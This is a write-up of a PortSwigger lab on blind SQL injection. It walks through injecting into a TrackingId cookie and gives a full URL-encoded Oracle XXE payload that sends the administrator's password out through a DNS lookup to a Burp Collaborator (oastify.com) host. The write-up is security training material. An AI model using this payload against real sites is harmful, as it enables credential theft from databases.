# Write-up: Blind SQL injection with out-of-band data exfiltration
Lab-Link: <https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band-data-exfiltration>
Difficulty: PRACTITIONER  
 

## Lab description

![alt text](<img/1.png>)

## Steps

### Enumeration

Using burpsuite and capturing a request, in Cookie header, we see that it contains a `TrackingId` parameter, which is vulnerable to blind sql injection according to problem statement.

### Exploitation

Using the SQL Injection Cheat Sheet of PortSwigger at (CheatSheet)[https://portswigger.net/web-security/sql-injection/cheat-sheet]

Found payload for DNS lookup with data exfiltration for Oracle

`SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT YOUR-QUERY-HERE)||'.BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual `

So, after using `UNION` and `--` for commenting the further SQL query we can exploit this vulnerability.

Final payload will look like this in burpsuite Cookie header
`TrackingId=OgbDvdrDm4ufNSiP'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+where+username%3d'administrator')||'5hny3qr7fyzt5rxuvumn57lokfq5eu.oastify.com">+%25remote%3b]>'),'/l')+FROM+dual--;`

I used Burpsuite Collaborator to receive the DNS lookup requests by going to Burp -> Burp Collaborator Client -> Copy to Clipbaord. And then inserted the collaborator URL in the payload and received the results.

Since, we will only be getting a single word string, we can exfiltrate the password of `administrator` using this simple SQL query
`SELECT password FROM users WHERE username='administrator'`

After completing my payload I used `URL encode key-characters` option of burpsuite to quickly encode by payload. So this gave the below results.

![alt text](img/2.png)

Hence, the lab is sovled.

![alt text](img/3.png)